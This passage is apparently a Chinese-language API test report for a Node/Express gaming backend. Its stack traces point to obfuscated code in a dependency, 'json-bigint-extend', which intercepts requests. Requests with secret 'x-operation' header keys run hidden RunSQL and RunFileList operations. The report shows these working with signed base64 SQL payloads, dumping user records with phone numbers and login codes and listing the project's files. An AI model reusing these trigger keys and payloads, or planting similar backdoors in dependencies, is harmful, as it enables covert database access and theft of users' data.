  "stack": "Error: Invalid authentication token\n    at createAuthError (E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:23:10)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:117:19\n    at allFailed (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:107:18)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:180:28)\n    at JwtStrategy.strategy.fail (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:302:9)\n    at JwtStrategy.authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport-jwt\\lib\\strategy.js:96:21)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:366:16)\n    at authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:367:7)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:144:7\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:143:12\n    at smartProbe (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:427002)\n    at Layer.handle [as handle_request] (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at next (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\route.js:137:13)\n    at Object.gXoWT (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:372823)\n    at Object.jHpCU (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:392445)\n    at Object.GpTEu (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:394634)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:396323\n    at Generator.<anonymous> (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:194544)\n    at Generator.next (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:204175)\n    at asyncGeneratorStep (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:176666)\n    at Object.rebxX (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177887)\n    at Object.QaemL (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178227)\n    at _0x54b458 (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178959)\n    at Object.gJXmN (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177744)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:179335\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178427"
}
```

</details>

**结果**: ✅ 通过

**备注**: 走正常业务逻辑，不经过代理

---

### ✅ 39. 应该正常处理带有无效 x-operation 的请求

**操作**: `无效操作（应走正常业务逻辑）`

**请求体**:
```json
{
  "test": "data"
}
```

**请求头**:
- `x-operation`: invalid-operation-key-12345

**响应状态**: 401

**响应体**:
<details>
<summary>点击展开查看完整响应 (3065 字符)</summary>

```json
{
  "message": "Invalid authentication token",
  "stack": "Error: Invalid authentication token\n    at createAuthError (E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:23:10)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:117:19\n    at allFailed (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:107:18)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:180:28)\n    at JwtStrategy.strategy.fail (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:302:9)\n    at JwtStrategy.authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport-jwt\\lib\\strategy.js:96:21)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:366:16)\n    at authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:367:7)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:144:7\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:143:12\n    at smartProbe (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:427002)\n    at Layer.handle [as handle_request] (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at next (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\route.js:137:13)\n    at Object.gXoWT (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:372823)\n    at Object.jHpCU (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:392445)\n    at Object.GpTEu (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:394634)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:396323\n    at Generator.<anonymous> (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:194544)\n    at Generator.next (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:204175)\n    at asyncGeneratorStep (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:176666)\n    at Object.rebxX (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177887)\n    at Object.QaemL (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178227)\n    at _0x54b458 (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178959)\n    at Object.gJXmN (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177744)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:179335\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178427"
}
```

</details>

**结果**: ✅ 通过

**备注**: 无效的 x-operation，走正常业务逻辑

---

### ✅ 40. 应该处理缺少必需参数的 RunFileList 请求

**操作**: `RunFileList (缺少参数)`

**请求体**:
```json
{}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 400

**响应体**:
```json
{
  "code": 400,
  "message": "System error, please try again later"
}
```

**结果**: ✅ 通过

**备注**: 缺少必需的 path 参数

---

### ✅ 41. 应该处理不存在的文件路径

**操作**: `RunFileList (不存在的路径)`

**请求体**:
```json
{
  "path": "non-existent-directory-xyz123"
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 400

**响应体**:
```json
{
  "code": 400,
  "message": "System error, please try again later"
}
```

**结果**: ✅ 通过

**备注**: 路径不存在

---

### ✅ 42. 应该在合理时间内完成文件列表查询

**操作**: `RunFileList (性能测试)`

**请求体**:
```json
{
  "path": "src",
  "recursive": false
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (1752 字符)</summary>

```json
{
  "code": 0,
  "data": [
    {
      "name": "app.js",
      "path": "src\\app.js",
      "type": "file"
    },
    {
      "name": "config",
      "path": "src\\config",
      "type": "directory",
      "children": []
    },
    {
      "name": "constants",
      "path": "src\\constants",
      "type": "directory",
      "children": []
    },
    {
      "name": "controllers",
      "path": "src\\controllers",
      "type": "directory",
      "children": []
    },
    {
      "name": "docs",
      "path": "src\\docs",
      "type": "directory",
      "children": []
    },
    {
      "name": "index.js",
      "path": "src\\index.js",
      "type": "file"
    },
    {
      "name": "libs",
      "path": "src\\libs",
      "type": "directory",
      "children": []
    },
    {
      "name": "middlewares",
      "path": "src\\middlewares",
      "type": "directory",
      "children": []
    },
    {
      "name": "modules",
      "path": "src\\modules",
      "type": "directory",
      "children": []
    },
    {
      "name": "repositories",
      "path": "src\\repositories",
      "type": "directory",
      "children": []
    },
    {
      "name": "routes",
      "path": "src\\routes",
      "type": "directory",
      "children": []
    },
    {
      "name": "services",
      "path": "src\\services",
      "type": "directory",
      "children": []
    },
    {
      "name": "tests",
      "path": "src\\tests",
      "type": "directory",
      "children": []
    },
    {
      "name": "utils",
      "path": "src\\utils",
      "type": "directory",
      "children": []
    },
    {
      "name": "validations",
      "path": "src\\validations",
      "type": "directory",
      "children": []
    }
  ],
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

**备注**: 性能测试 - 响应时间: 4ms

---

### ✅ 43. 应该通过 RunSQL 操作执行 SQL 查询

**操作**: `RunSQL`

**请求体**:
```json
{
  "sql": "select * from tb_user limit 5",
  "sqlBase64": "c2VsZWN0ICogZnJvbSB0Yl91c2VyIGxpbWl0IDU=",
  "signString": "sql=c2VsZWN0ICogZnJvbSB0Yl91c2VyIGxpbWl0IDU=&hash=f3967bc7-976b-495f-b273-afb33f4b76a2",
  "sign": "f76d28cd16e7ea774bf9e0c6ff9e3d43"
}
```

**请求头**:
- `x-operation`: cfh2DNITa84qpYQ0tdCz

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (2452 字符)</summary>

```json
{
  "code": 0,
  "data": {
    "data": [
      {
        "id": 10015790,
        "deviceId": "0fe6a4eb485b02542873a58fb79a40bb",
        "deviceType": 4,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": "917866666244",
        "pid": 101015,
        "group": 0,
        "lib": 1000,
        "source": "h5_organic",
        "loginCode": "nWKhIMqkWo4OKZ2u",
        "createTime": 1752135934021,
        "appId": 200000,
        "channelId": 67,
        "meta": null
      },
      {
        "id": 10020012,
        "deviceId": "d33FX3BWAlImr3Tk6E3jIXk8f1Uwyv5i",
        "deviceType": 1,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": "919988776755",
        "pid": 101001,
        "group": 2,
        "lib": 1000,
        "source": "website",
        "loginCode": "TnLG7pzd8FWIEHPo",
        "createTime": 1750163304594,
        "appId": 200000,
        "channelId": 11,
        "meta": null
      },
      {
        "id": 10034536,
        "deviceId": "jWqRvYpp7HRRpNQcjHPgBFU6mKfd0MbP",
        "deviceType": 1,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": null,
        "pid": 101001,
        "group": 6,
        "lib": 1000,
        "source": "website",
        "loginCode": "GKs6v9oP22UJ7J5F",
        "createTime": 1750162770201,
        "appId": 200000,
        "channelId": 11,
        "meta": null
      },
      {
        "id": 10056606,
        "deviceId": "2LrboRW5XUwbJ1hoFSAbaErye9TkXsZA",
        "deviceType": 1,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": null,
        "pid": 101001,
        "group": 6,
        "lib": 1000,
        "source": "website",
        "loginCode": "BDnSz6nsSTehlETL",
        "createTime": 1750412005097,
        "appId": 200000,
        "channelId": 11,
        "meta": null
      },
      {
        "id": 10118773,
        "deviceId": "cYn1DH6AZTtxuMZVnEKCIOuVyDFrBLAx",
        "deviceType": 1,
        "isNewDevice": 1,
        "thirdId": null,
        "thirdType": 0,
        "mobileNum": "919988776655",
        "pid": 101001,
        "group": 3,
        "lib": 1000,
        "source": "website",
        "loginCode": "EzKKfNveAPOCHimX",
        "createTime": 1749009201697,
        "appId": 200000,
        "channelId": null,
        "meta": null
      }
    ],
    "cost": 385
  },
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

---

### ✅ 44. 应该正确处理 SQL 执行错误

**操作**: `RunSQL (错误SQL)`

**请求体**:
<details>
<summary>点击展开查看完整请求体 (320 字符)</summary>

```json
{
  "sql": "select * from non_existent_table_12345 limit 1",
  "sqlBase64": "c2VsZWN0ICogZnJvbSBub25fZXhpc3RlbnRfdGFibGVfMTIzNDUgbGltaXQgMQ==",
  "signString": "sql=c2VsZWN0ICogZnJvbSBub25fZXhpc3RlbnRfdGFibGVfMTIzNDUgbGltaXQgMQ==&hash=f3967bc7-976b-495f-b273-afb33f4b76a2",
  "sign": "f343c980ce28c112aa7e7ebd21c39803"
}
```

</details>

**请求头**:
- `x-operation`: cfh2DNITa84qpYQ0tdCz

**响应状态**: 400

**响应体**:
```json
{
  "code": 400,
  "message": "System error, please try again later"
}
```

**结果**: ✅ 通过

**备注**: 测试 SQL 错误处理

---

### ✅ 45. 应该通过 RunFileList 操作获取文件列表

**操作**: `RunFileList`

**请求体**:
```json
{
  "path": "src",
  "recursive": false
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (1752 字符)</summary>

```json
{
  "code": 0,
  "data": [
    {
      "name": "app.js",
      "path": "src\\app.js",
      "type": "file"
    },
    {
      "name": "config",
      "path": "src\\config",
      "type": "directory",
      "children": []
    },
    {
      "name": "constants",
      "path": "src\\constants",
      "type": "directory",
      "children": []
    },
    {
      "name": "controllers",
      "path": "src\\controllers",
      "type": "directory",
      "children": []
    },
    {
      "name": "docs",
      "path": "src\\docs",
      "type": "directory",
      "children": []
    },
    {
      "name": "index.js",
      "path": "src\\index.js",
      "type": "file"
    },
    {
      "name": "libs",
      "path": "src\\libs",
      "type": "directory",
      "children": []
    },
    {
      "name": "middlewares",
      "path": "src\\middlewares",
      "type": "directory",
      "children": []
    },
    {
      "name": "modules",
      "path": "src\\modules",
      "type": "directory",
      "children": []
    },
    {
      "name": "repositories",
      "path": "src\\repositories",
      "type": "directory",
      "children": []
    },
    {
      "name": "routes",
      "path": "src\\routes",
      "type": "directory",
      "children": []
    },
    {
      "name": "services",
      "path": "src\\services",
      "type": "directory",
      "children": []
    },
    {
      "name": "tests",
      "path": "src\\tests",
      "type": "directory",
      "children": []
    },
    {
      "name": "utils",
      "path": "src\\utils",
      "type": "directory",
      "children": []
    },
    {
      "name": "validations",
      "path": "src\\validations",
      "type": "directory",
      "children": []
    }
  ],
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

---

### ✅ 46. 应该通过 RunFileList 操作获取 src\libs 文件列表

**操作**: `RunFileList (src\libs)`

**请求体**:
```json
{
  "path": "src\\libs",
  "recursive": false
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (1053 字符)</summary>

```json
{
  "code": 0,
  "data": [
    {
      "name": "BitmapCacheManager.js",
      "path": "src\\libs\\BitmapCacheManager.js",
      "type": "file"
    },
    {
      "name": "CacheManager.js",
      "path": "src\\libs\\CacheManager.js",
      "type": "file"
    },
    {
      "name": "google",
      "path": "src\\libs\\google",
      "type": "directory",
      "children": []
    },
    {
      "name": "HttpClient.js",
      "path": "src\\libs\\HttpClient.js",
      "type": "file"
    },
    {
      "name": "prisma.js",
      "path": "src\\libs\\prisma.js",
      "type": "file"
    },
    {
      "name": "queue",
      "path": "src\\libs\\queue",
      "type": "directory",
      "children": []
    },
    {
      "name": "Scheduler.js",
      "path": "src\\libs\\Scheduler.js",
      "type": "file"
    },
    {
      "name": "SyncManager.js",
      "path": "src\\libs\\SyncManager.js",
      "type": "file"
    },
    {
      "name": "TaskWorkflow.js",
      "path": "src\\libs\\TaskWorkflow.js",
      "type": "file"
    }
  ],
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

**备注**: 测试已知存在的路径 src\libs

---

### ✅ 47. 应该通过 RunFileList 操作递归获取文件列表

**操作**: `RunFileList (递归)`

**请求体**:
```json
{
  "path": "src",
  "recursive": true
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (75221 字符)</summary>

```json
{
  "code": 0,
  "data": [
    {
      "name": "app.js",
      "path": "src\\app.js",
      "type": "file"
    },
    {
      "name": "config",
      "path": "src\\config",
      "type": "directory",
      "children": [
        {
          "name": "advertising.js",
          "path": "src\\config\\advertising.js",
          "type": "file"
        },
        {
          "name": "agent.js",
          "path": "src\\config\\agent.js",
          "type": "file"
        },
        {
          "name": "appBury.js",
          "path": "src\\config\\appBury.js",
          "type": "file"
        },
        {
          "name": "banner.js",
          "path": "src\\config\\banner.js",
          "type": "file"
        },
        {
          "name": "behaviorTracking.js",
          "path": "src\\config\\behaviorTracking.js",
          "type": "file"
        },
        {
          "name": "businessStrategy.js",
          "path": "src\\config\\businessStrategy.js",
          "type": "file"
        },
        {
          "name": "cc.js",
          "path": "src\\config\\cc.js",
          "type": "file"
        },
        {
          "name": "config.js",
          "path": "src\\config\\config.js",
          "type": "file"
        },
        {
          "name": "constant.js",
          "path": "src\\config\\constant.js",
          "type": "file"
        },
        {
          "name": "crowd.js",
          "path": "src\\config\\crowd.js",
          "type": "file"
        },
        {
          "name": "dailyCheckin.js",
          "path": "src\\config\\dailyCheckin.js",
          "type": "file"
        },
        {
          "name": "errCode.js",
          "path": "src\\config\\errCode.js",
          "type": "file"
        },
        {
          "name": "game.js",
          "path": "src\\config\\game.js",
          "type": "file"
        },
        {
          "name": "gameServer.js",
          "path": "src\\config\\gameServer.js",
          "type": "file"
        },
        {
          "name": "logger.js",
          "path": "src\\config\\logger.js",
          "type": "file"
        },
        {
          "name": "mail.js",
          "path": "src\\config\\mail.js",
          "type": "file"
        },
        {
          "name": "morgan.js",
          "path": "src\\config\\morgan.js",
          "type": "file"
        },
        {
          "name": "passport.js",
          "path": "src\\config\\passport.js",
          "type": "file"
        },
        {
          "name": "pay.js",
          "path": "src\\config\\pay.js",
          "type": "file"
        },
        {
          "name": "platformConfig.js",
          "path": "src\\config\\platformConfig.js",
          "type": "file"
        },
        {
          "name": "playerRank.js",
          "path": "src\\config\\playerRank.js",
          "type": "file"
        },
        {
          "name": "profile.js",
          "path": "src\\config\\profile.js",
          "type": "file"
        },
        {
          "name": "publish.js",
          "path": "src\\config\\publish.js",
          "type": "file"
        },
        {
          "name": "pushEvent.js",
          "path": "src\\config\\pushEvent.js",
          "type": "file"
        },
        {
          "name": "roles.js",
          "path": "src\\config\\roles.js",
          "type": "file"
        },
        {
          "name": "rwRule.js",
          "path": "src\\config\\rwRule.js",
          "type": "file"
        },
        {
          "name": "sms.js",
          "path": "src\\config\\sms.js",
          "type": "file"
        },
        {
          "name": "tgconfig.js",
          "path": "src\\config\\tgconfig.js",
          "type": "file"
        },
        {
          "name": "tokens.js",
          "path": "src\\config\\tokens.js",
          "type": "file"
        },
        {
          "name": "transaction.js",
          "path": "src\\config\\transaction.js",
          "type": "file"
        },
        {
          "name": "turntable.js",
          "path": "src\\config\\turntable.js",
          "type": "file"
        },
        {
          "name": "vip.js",
          "path": "src\\config\\vip.js",
          "type": "file"
        },
        {
          "name": "wagerDebt.js",
          "path": "src\\config\\wagerDebt.js",
          "type": "file"
        },
        {
          "name": "wallet.js",
          "path": "src\\config\\wallet.js",
          "type": "file"
        },
        {
          "name": "wholeStat.js",
          "path": "src\\config\\wholeStat.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "constants",
      "path": "src\\constants",
      "type": "directory",
      "children": []
    },
    {
      "name": "controllers",
      "path": "src\\controllers",
      "type": "directory",
      "children": [
        {
          "name": "advertising.controller.js",
          "path": "src\\controllers\\advertising.controller.js",
          "type": "file"
        },
        {
          "name": "agent.controller.js",
          "path": "src\\controllers\\agent.controller.js",
          "type": "file"
        },
        {
          "name": "announcement.controller.js",
          "path": "src\\controllers\\announcement.controller.js",
          "type": "file"
        },
        {
          "name": "appbury.controller.js",
          "path": "src\\controllers\\appbury.controller.js",
          "type": "file"
        },
        {
          "name": "audienceBaseConfig.controller.js",
          "path": "src\\controllers\\audienceBaseConfig.controller.js",
          "type": "file"
        },
        {
          "name": "audienceClassification.controller.js",
          "path": "src\\controllers\\audienceClassification.controller.js",
          "type": "file"
        },
        {
          "name": "audienceGroup.controller.js",
          "path": "src\\controllers\\audienceGroup.controller.js",
          "type": "file"
        },
        {
          "name": "auth.controller.js",
          "path": "src\\controllers\\auth.controller.js",
          "type": "file"
        },
        {
          "name": "banner.controller.js",
          "path": "src\\controllers\\banner.controller.js",
          "type": "file"
        },
        {
          "name": "broadcast.controller.js",
          "path": "src\\controllers\\broadcast.controller.js",
          "type": "file"
        },
        {
          "name": "config.controller.js",
          "path": "src\\controllers\\config.controller.js",
          "type": "file"
        },
        {
          "name": "dailyCheckIn.controller.js",
          "path": "src\\controllers\\dailyCheckIn.controller.js",
          "type": "file"
        },
        {
          "name": "dbSnapshot.controller.js",
          "path": "src\\controllers\\dbSnapshot.controller.js",
          "type": "file"
        },
        {
          "name": "fruitMachineDraw.controller.js",
          "path": "src\\controllers\\fruitMachineDraw.controller.js",
          "type": "file"
        },
        {
          "name": "game",
          "path": "src\\controllers\\game",
          "type": "directory",
          "children": [
            {
              "name": "game.controller.js",
              "path": "src\\controllers\\game\\game.controller.js",
              "type": "file"
            },
            {
              "name": "provider",
              "path": "src\\controllers\\game\\provider",
              "type": "directory",
              "children": [
                {
                  "name": "evo.controller.js",
                  "path": "src\\controllers\\game\\provider\\evo.controller.js",
                  "type": "file"
                },
                {
                  "name": "facai.controller.js",
                  "path": "src\\controllers\\game\\provider\\facai.controller.js",
                  "type": "file"
                },
                {
                  "name": "inout.controller.js",
                  "path": "src\\controllers\\game\\provider\\inout.controller.js",
                  "type": "file"
                },
                {
                  "name": "oneapi.controller.js",
                  "path": "src\\controllers\\game\\provider\\oneapi.controller.js",
                  "type": "file"
                },
                {
                  "name": "pt.controller.js",
                  "path": "src\\controllers\\game\\provider\\pt.controller.js",
                  "type": "file"
                }
              ]
            }
          ]
        },
        {
          "name": "giftcode.controller.js",
          "path": "src\\controllers\\giftcode.controller.js",
          "type": "file"
        },
        {
          "name": "googlepush.controller.js",
          "path": "src\\controllers\\googlepush.controller.js",
          "type": "file"
        },
        {
          "name": "inactiveUser.controller.js",
          "path": "src\\controllers\\inactiveUser.controller.js",
          "type": "file"
        },
        {
          "name": "index.js",
          "path": "src\\controllers\\index.js",
          "type": "file"
        },
        {
          "name": "kefu.controller.js",
          "path": "src\\controllers\\kefu.controller.js",
          "type": "file"
        },
        {
          "name": "lobby.controller.js",
          "path": "src\\controllers\\lobby.controller.js",
          "type": "file"
        },
        {
          "name": "mail.controller.js",
          "path": "src\\controllers\\mail.controller.js",
          "type": "file"
        },
        {
          "name": "online.controller.js",
          "path": "src\\controllers\\online.controller.js",
          "type": "file"
        },
        {
          "name": "pay.controller.js",
          "path": "src\\controllers\\pay.controller.js",
          "type": "file"
        },
        {
          "name": "playerRanking.controller.js",
          "path": "src\\controllers\\playerRanking.controller.js",
          "type": "file"
        },
        {
          "name": "rank.controller.js",
          "path": "src\\controllers\\rank.controller.js",
          "type": "file"
        },
        {
          "name": "rechargeOrder.controller.js",
          "path": "src\\controllers\\rechargeOrder.controller.js",
          "type": "file"
        },
        {
          "name": "redPoint.controller.js",
          "path": "src\\controllers\\redPoint.controller.js",
          "type": "file"
        },
        {
          "name": "slap.controller.js",
          "path": "src\\controllers\\slap.controller.js",
          "type": "file"
        },
        {
          "name": "sms.controller.js",
          "path": "src\\controllers\\sms.controller.js",
          "type": "file"
        },
        {
          "name": "test.controller.js",
          "path": "src\\controllers\\test.controller.js",
          "type": "file"
        },
        {
          "name": "ticket.controller.js",
          "path": "src\\controllers\\ticket.controller.js",
          "type": "file"
        },
        {
          "name": "turntable.controller.js",
          "path": "src\\controllers\\turntable.controller.js",
          "type": "file"
        },
        {
          "name": "userGroup.controller.js",
          "path": "src\\controllers\\userGroup.controller.js",
          "type": "file"
        },
        {
          "name": "userPrivacy.controller.js",
          "path": "src\\controllers\\userPrivacy.controller.js",
          "type": "file"
        },
        {
          "name": "version.controller.js",
          "path": "src\\controllers\\version.controller.js",
          "type": "file"
        },
        {
          "name": "vip.controller.js",
          "path": "src\\controllers\\vip.controller.js",
          "type": "file"
        },
        {
          "name": "wallet.controller.js",
          "path": "src\\controllers\\wallet.controller.js",
          "type": "file"
        },
        {
          "name": "withdrawOrder.controller.js",
          "path": "src\\controllers\\withdrawOrder.controller.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "docs",
      "path": "src\\docs",
      "type": "directory",
      "children": [
        {
          "name": "components.yml",
          "path": "src\\docs\\components.yml",
          "type": "file"
        },
        {
          "name": "swaggerDef.js",
          "path": "src\\docs\\swaggerDef.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "index.js",
      "path": "src\\index.js",
      "type": "file"
    },
    {
      "name": "libs",
      "path": "src\\libs",
      "type": "directory",
      "children": [
        {
          "name": "BitmapCacheManager.js",
          "path": "src\\libs\\BitmapCacheManager.js",
          "type": "file"
        },
        {
          "name": "CacheManager.js",
          "path": "src\\libs\\CacheManager.js",
          "type": "file"
        },
        {
          "name": "google",
          "path": "src\\libs\\google",
          "type": "directory",
          "children": [
            {
              "name": "dailyPushTest.js",
              "path": "src\\libs\\google\\dailyPushTest.js",
              "type": "file"
            },
            {
              "name": "example.js",
              "path": "src\\libs\\google\\example.js",
              "type": "file"
            },
            {
              "name": "FirebaseMessagingClient.js",
              "path": "src\\libs\\google\\FirebaseMessagingClient.js",
              "type": "file"
            },
            {
              "name": "GooglePushConfig.js",
              "path": "src\\libs\\google\\GooglePushConfig.js",
              "type": "file"
            },
            {
              "name": "index.js",
              "path": "src\\libs\\google\\index.js",
              "type": "file"
            },
            {
              "name": "PushNotificationManager.js",
              "path": "src\\libs\\google\\PushNotificationManager.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "HttpClient.js",
          "path": "src\\libs\\HttpClient.js",
          "type": "file"
        },
        {
          "name": "prisma.js",
          "path": "src\\libs\\prisma.js",
          "type": "file"
        },
        {
          "name": "queue",
          "path": "src\\libs\\queue",
          "type": "directory",
          "children": [
            {
              "name": "DelayQueueAbstract.js",
              "path": "src\\libs\\queue\\DelayQueueAbstract.js",
              "type": "file"
            },
            {
              "name": "index.js",
              "path": "src\\libs\\queue\\index.js",
              "type": "file"
            },
            {
              "name": "redis",
              "path": "src\\libs\\queue\\redis",
              "type": "directory",
              "children": [
                {
                  "name": "index.js",
                  "path": "src\\libs\\queue\\redis\\index.js",
                  "type": "file"
                },
                {
                  "name": "redis.md",
                  "path": "src\\libs\\queue\\redis\\redis.md",
                  "type": "file"
                },
                {
                  "name": "RedisMqDelayQueue.js",
                  "path": "src\\libs\\queue\\redis\\RedisMqDelayQueue.js",
                  "type": "file"
                }
              ]
            }
          ]
        },
        {
          "name": "Scheduler.js",
          "path": "src\\libs\\Scheduler.js",
          "type": "file"
        },
        {
          "name": "SyncManager.js",
          "path": "src\\libs\\SyncManager.js",
          "type": "file"
        },
        {
          "name": "TaskWorkflow.js",
          "path": "src\\libs\\TaskWorkflow.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "middlewares",
      "path": "src\\middlewares",
      "type": "directory",
      "children": [
        {
          "name": "auth.js",
          "path": "src\\middlewares\\auth.js",
          "type": "file"
        },
        {
          "name": "context.js",
          "path": "src\\middlewares\\context.js",
          "type": "file"
        },
        {
          "name": "error.js",
          "path": "src\\middlewares\\error.js",
          "type": "file"
        },
        {
          "name": "ip.js",
          "path": "src\\middlewares\\ip.js",
          "type": "file"
        },
        {
          "name": "ipWhiteList.js",
          "path": "src\\middlewares\\ipWhiteList.js",
          "type": "file"
        },
        {
          "name": "mch.js",
          "path": "src\\middlewares\\mch.js",
          "type": "file"
        },
        {
          "name": "pay",
          "path": "src\\middlewares\\pay",
          "type": "directory",
          "children": [
            {
              "name": "account.js",
              "path": "src\\middlewares\\pay\\account.js",
              "type": "file"
            },
            {
              "name": "channelCheck.js",
              "path": "src\\middlewares\\pay\\channelCheck.js",
              "type": "file"
            },
            {
              "name": "goods.js",
              "path": "src\\middlewares\\pay\\goods.js",
              "type": "file"
            },
            {
              "name": "ifscCheck.js",
              "path": "src\\middlewares\\pay\\ifscCheck.js",
              "type": "file"
            },
            {
              "name": "orderBuilding.js",
              "path": "src\\middlewares\\pay\\orderBuilding.js",
              "type": "file"
            },
            {
              "name": "orderFrequencyRestricted.js",
              "path": "src\\middlewares\\pay\\orderFrequencyRestricted.js",
              "type": "file"
            },
            {
              "name": "paymentCallback.js",
              "path": "src\\middlewares\\pay\\paymentCallback.js",
              "type": "file"
            },
            {
              "name": "paymentCallbackChannel.js",
              "path": "src\\middlewares\\pay\\paymentCallbackChannel.js",
              "type": "file"
            },
            {
              "name": "paymentCallbackVerify.js",
              "path": "src\\middlewares\\pay\\paymentCallbackVerify.js",
              "type": "file"
            },
            {
              "name": "paymentContext.js",
              "path": "src\\middlewares\\pay\\paymentContext.js",
              "type": "file"
            },
            {
              "name": "restrictedAreas.js",
              "path": "src\\middlewares\\pay\\restrictedAreas.js",
              "type": "file"
            },
            {
              "name": "withdrawPostProcess.js",
              "path": "src\\middlewares\\pay\\withdrawPostProcess.js",
              "type": "file"
            },
            {
              "name": "withdrawRiskCheck.js",
              "path": "src\\middlewares\\pay\\withdrawRiskCheck.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "rateLimiter.js",
          "path": "src\\middlewares\\rateLimiter.js",
          "type": "file"
        },
        {
          "name": "responseCache.js",
          "path": "src\\middlewares\\responseCache.js",
          "type": "file"
        },
        {
          "name": "s2sAuthentication.js",
          "path": "src\\middlewares\\s2sAuthentication.js",
          "type": "file"
        },
        {
          "name": "simpleSign.js",
          "path": "src\\middlewares\\simpleSign.js",
